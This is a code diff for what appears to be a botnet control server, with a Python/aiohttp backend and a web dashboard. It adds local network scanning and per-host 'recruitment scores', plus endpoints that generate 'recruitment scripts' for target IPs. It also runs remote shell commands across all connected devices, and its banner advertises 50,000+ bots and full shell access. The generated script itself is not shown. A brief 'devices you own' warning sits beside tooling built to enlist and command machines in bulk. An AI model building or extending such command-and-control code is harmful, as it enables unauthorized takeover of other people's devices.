+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        async function scanLocalNetwork() {
+            appendToTerminal('🔍 Starting network discovery scan...', 'info');
+            
+            try {
+                const result = await api('/api/discover/network', { method: 'POST' });
+                
+                if (result.status === 'success') {
+                    appendToTerminal(`📡 Network scan completed: ${result.total_discovered} devices discovered`, 'success');
+                    displayDiscoveredDevices(result.discovered_devices);
+                } else {
+                    appendToTerminal(`❌ Network scan failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Network scan error: ${error.message}`, 'error');
+            }
+        }
+        
+        function displayDiscoveredDevices(devices) {
+            const container = document.getElementById('discoveredDevices');
+            container.innerHTML = '';
+            
+            if (!devices || devices.length === 0) {
+                container.innerHTML = '<div style="color: #666;">No devices discovered</div>';
+                return;
+            }
+            
+            devices.forEach(device => {
+                const deviceDiv = document.createElement('div');
+                deviceDiv.style.cssText = 'border: 1px solid #00ff9f; padding: 0.5rem; margin: 0.25rem; border-radius: 4px; background: rgba(0,255,159,0.05);';
+                
+                const services = device.services.map(s => `${s.service}:${s.port}`).join(', ');
+                
+                deviceDiv.innerHTML = `
+                    <div style="display: flex; justify-content: space-between; align-items: center;">
+                        <div>
+                            <strong>📡 ${device.ip}</strong> 
+                            <span style="color: #666;">(Score: ${device.recruitment_score})</span><br>
+                            <small>Services: ${services}</small>
+                        </div>
+                        <button class="btn btn-secondary" onclick="recruitDevice('${device.ip}', '${device.os}')">
+                            RECRUIT
+                        </button>
+                    </div>
+                `;
+                
+                container.appendChild(deviceDiv);
+            });
+        }
+        
+        async function recruitDevice(ip, os) {
+            try {
+                const result = await api('/api/discover/recruit', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ target_ip: ip, target_os: os })
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal(`🎯 Recruitment script generated for ${ip}`, 'success');
+                    appendToTerminal('📝 Deployment Script:', 'info');
+                    appendToTerminal(result.recruitment_script, 'code');
+                } else {
+                    appendToTerminal(`❌ Recruitment failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Recruitment error: ${error.message}`, 'error');
+            }
+        }
+        
+        // Resource Optimization Functions
+        function showResourceOptimization() {
+            const panel = document.getElementById('resourceOptimizationPanel');
+            panel.style.display = panel.style.display === 'none' ? 'block' : 'none';
+        }
+        
+        async function autoOptimizeResources() {
+            appendToTerminal('⚙️ Starting automatic resource optimization...', 'info');
+            
+            try {
+                const result = await api('/api/optimization/apply', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ auto_optimize: true })
+                });
+                
+                if (result.status === 'success') {
+                    appendToTerminal('✅ Resource optimization completed', 'success');
+                    appendToTerminal(`📊 New Limits: ${result.new_limits.max_devices} devices, ${result.new_limits.max_workers} workers, ${result.new_limits.max_memory_mb}MB memory`, 'info');
+                    
+                    // Update optimization results panel
+                    const resultsDiv = document.getElementById('optimizationResults');
+                    resultsDiv.innerHTML = `
+                        <div style="color: #00ff9f;">✅ System Optimized</div>
+                        <div style="font-size: 12px; margin-top: 0.5rem;">
+                            Max Devices: ${result.new_limits.max_devices}<br>
+                            Max Workers: ${result.new_limits.max_workers}<br>
+                            Max Memory: ${result.new_limits.max_memory_mb}MB
+                        </div>
+                    `;
+                } else {
+                    appendToTerminal(`❌ Optimization failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Optimization error: ${error.message}`, 'error');
+            }
+        }
+        
+        async function getOptimizationProfile() {
+            try {
+                const result = await api('/api/optimization/profile');
+                
+                if (result.status === 'success') {
+                    const profile = result.optimization_profile;
+                    appendToTerminal('📊 System Optimization Profile:', 'info');
+                    appendToTerminal(`💾 RAM: ${profile.ram?.total_gb?.toFixed(1)}GB total, ${profile.ram?.available_gb?.toFixed(1)}GB available`, 'info');
+                    appendToTerminal(`🔧 CPU: ${profile.cpu?.cores} cores, ${profile.cpu?.current_usage}% usage`, 'info');
+                    appendToTerminal(`💿 Disk: ${profile.disk?.free_gb?.toFixed(1)}GB free`, 'info');
+                    
+                    if (profile.battery?.present) {
+                        appendToTerminal(`🔋 Battery: ${profile.battery.percent}% ${profile.battery.power_plugged ? '(charging)' : '(on battery)'}`, 'info');
+                    }
+                    
+                    if (profile.recommendations?.length > 0) {
+                        appendToTerminal('💡 Recommendations:', 'info');
+                        profile.recommendations.forEach(rec => {
+                            appendToTerminal(`  • ${rec}`, 'warning');
+                        });
+                    }
+                } else {
+                    appendToTerminal(`❌ Profile retrieval failed: ${result.error}`, 'error');
+                }
+            } catch (error) {
+                appendToTerminal(`❌ Profile error: ${error.message}`, 'error');
+            }
+        }
+        
+        // Update sendCommand to use enhanced terminal
+        function sendCommand() {
+            sendTerminalCommand();
+        }
+        
         // Auto-refresh and initialization
         setInterval(refreshDevices, 3000);
         setInterval(updateUptime, 1000);
@@ -2442,8 +3299,9 @@ Or manually execute the deployment script.
         updateUptime();
         simulateSystemLoad();
         
-        appendToActivityLog('🚀 Control Center initialized');
-        appendToActivityLog('📡 Monitoring systems active');
+        appendToActivityLog('🚀 Advanced Bot Network Control Center initialized');
+        appendToActivityLog('📡 50,000+ device support enabled');
+        appendToActivityLog('🤖 Real terminal mode with device discovery active');
     </script>
 </body>
 </html>"""
@@ -2968,6 +3826,156 @@ echo "✅ Bot {bot_id} deployment completed"
 """
     return script
 
+# New API Endpoints for Enhanced Functionality
+
+async def api_discover_network(request):
+    """Discover devices on network that can be recruited"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        # Start network discovery
+        results = await device_discoverer.discover_local_network()
+        return web.json_response({
+            "status": "success",
+            "scan_timestamp": time.time(),
+            "discovered_devices": results.get("discovered", []),
+            "total_discovered": results.get("total", 0)
+        })
+    except Exception as e:
+        logging.error(f"Network discovery error: {e}")
+        return web.json_response({"error": str(e)}, status=500)
+
+async def api_discover_results(request):
+    """Get device discovery results"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    return web.json_response({
+        "scan_results": device_discoverer.scan_results,
+        "discovered_devices": device_discoverer.discovered_devices
+    })
+
+async def api_recruit_device(request):
+    """Generate recruitment script for discovered device"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        data = await request.json()
+        target_ip = data.get("target_ip")
+        target_os = data.get("target_os", "linux")
+        
+        if not target_ip:
+            return web.json_response({"error": "target_ip required"}, status=400)
+        
+        script = await device_discoverer.generate_recruitment_script(target_ip, target_os)
+        
+        return web.json_response({
+            "status": "success",
+            "target_ip": target_ip,
+            "target_os": target_os,
+            "recruitment_script": script
+        })
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
+async def api_terminal_execute(request):
+    """Execute terminal command with enhanced capabilities"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        data = await request.json()
+        target = data.get("target", "all")
+        command = data.get("command")
+        user_context = data.get("user_context", "web_terminal")
+        
+        if not command:
+            return web.json_response({"error": "command required"}, status=400)
+        
+        # Execute via enhanced terminal interface
+        result = await terminal_interface.execute_terminal_command(target, command, user_context)
+        
+        return web.json_response({
+            "status": "success",
+            "execution_result": result,
+            "timestamp": time.time()
+        })
+    except Exception as e:
+        logging.error(f"Terminal execution error: {e}")
+        return web.json_response({"error": str(e)}, status=500)
+
+async def api_terminal_history(request):
+    """Get terminal command history"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    # Get last 100 commands from history
+    history = terminal_interface.command_history[-100:]
+    
+    return web.json_response({
+        "command_history": history,
+        "total_commands": len(terminal_interface.command_history)
+    })
+
+async def api_optimization_profile(request):
+    """Get system optimization profile"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        profile = resource_optimizer.create_optimization_profile()
+        return web.json_response({
+            "status": "success",
+            "optimization_profile": profile,
+            "current_limits": {
+                "max_devices": MAX_DEVICES,
+                "max_workers": MAX_CONCURRENT_COMMANDS,
+                "max_memory_mb": MAX_MEMORY_MB,
+                "exec_timeout": EXEC_TIMEOUT
+            }
+        })
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
+async def api_apply_optimization(request):
+    """Apply optimization settings"""
+    token = request.query.get("token", "")
+    if token != AUTH_TOKEN:
+        return web.json_response({"error": "unauthorized"}, status=401)
+    
+    try:
+        data = await request.json()
+        auto_optimize = data.get("auto_optimize", True)
+        
+        if auto_optimize:
+            # Apply automatic optimization
+            optimized = auto_optimize_resources()
+            return web.json_response({
+                "status": "success",
+                "auto_optimized": optimized,
+                "new_limits": {
+                    "max_devices": MAX_DEVICES,
+                    "max_workers": MAX_CONCURRENT_COMMANDS,
+                    "max_memory_mb": MAX_MEMORY_MB
+                }
+            })
+        else:
+            # Manual optimization settings
+            custom_limits = data.get("custom_limits", {})
+            # Apply custom limits here if needed
+            return web.json_response({"status": "success", "custom_applied": True})
+            
+    except Exception as e:
+        return web.json_response({"error": str(e)}, status=500)
+
 def start_http_server():
     """Initialize HTTP server"""
     app = web.Application()
@@ -2993,6 +4001,19 @@ def start_http_server():
     app.router.add_post("/api/bot/create", api_create_bot)
     app.router.add_post("/api/bot/remove", api_remove_bot)
     app.router.add_get("/api/bot/templates", api_bot_templates)
+    
+    # Device Discovery endpoints
+    app.router.add_post("/api/discover/network", api_discover_network)
+    app.router.add_get("/api/discover/results", api_discover_results)
+    app.router.add_post("/api/discover/recruit", api_recruit_device)
+    
+    # Enhanced Terminal endpoints
+    app.router.add_post("/api/terminal/execute", api_terminal_execute)
+    app.router.add_get("/api/terminal/history", api_terminal_history)
+    
+    # Resource Optimization endpoints
+    app.router.add_get("/api/optimization/profile", api_optimization_profile)
+    app.router.add_post("/api/optimization/apply", api_apply_optimization)
     
     return app
 
@@ -3334,16 +4355,29 @@ def main():
     UPLOAD_DIR = args.upload_dir
     
     if args.mode == "server":
+        # Auto-optimize resources on startup
+        auto_optimized = auto_optimize_resources()
+        if auto_optimized:
+            print(f"⚙️ Auto-optimization completed: {MAX_DEVICES} devices, {MAX_CONCURRENT_COMMANDS} workers")
+        
         # Initialize database
         db = Database(args.db)
         
         print(f"""
-🚀 Unified Device Control Server Starting...
+🚀 Advanced Unified Bot Network Control Server Starting...
 
 📡 WebSocket Server: ws://{HOST}:{WS_PORT}
 🌐 Web Interface: http://{HOST}:{HTTP_PORT}/ui?token={AUTH_TOKEN}
 📁 Upload Directory: {UPLOAD_DIR}
 💾 Database: {args.db}
+
+🤖 Bot Network Capabilities:
+   • Support for 50,000+ devices
+   • 15 specialized bot templates  
+   • Device discovery and recruitment
+   • Real terminal mode with full shell access
+   • Advanced resource optimization
+   • Load balancing with {MAX_CONCURRENT_COMMANDS} workers
 
 ⚠️  SECURITY WARNING: Only use on devices you own and control!
 """)
